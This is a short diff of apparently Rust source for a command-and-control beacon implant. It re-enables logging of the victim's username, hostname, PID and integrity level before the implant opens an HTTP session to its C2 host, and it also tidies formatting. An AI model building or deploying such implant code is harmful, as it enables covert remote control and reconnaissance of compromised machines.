@@ -314,14 +314,15 @@ pub unsafe fn beacon_loop(config: &C2Config) {
     debug!("[BEACON] SessionID: {}", session_id);
 
     let sysinfo = gather_sysinfo();
-    // debug!("[BEACON] {}@{} PID:{} ({})", sysinfo.username, sysinfo.hostname, sysinfo.pid, sysinfo.integrity);
+    debug!("[BEACON] {}@{} PID:{} ({})", sysinfo.username, sysinfo.hostname, sysinfo.pid, sysinfo.integrity);
 
+    // Establish HTTP session
     let session = match HttpSession::new(config.host, config.port, config.use_https) {
         Some(s) => s,
-        None =>  {
+        None => {
             debug!("[BEACON] Failed to establish HTTP session");
             return;
-        },
+        }
     };
 
     // Beacon paths
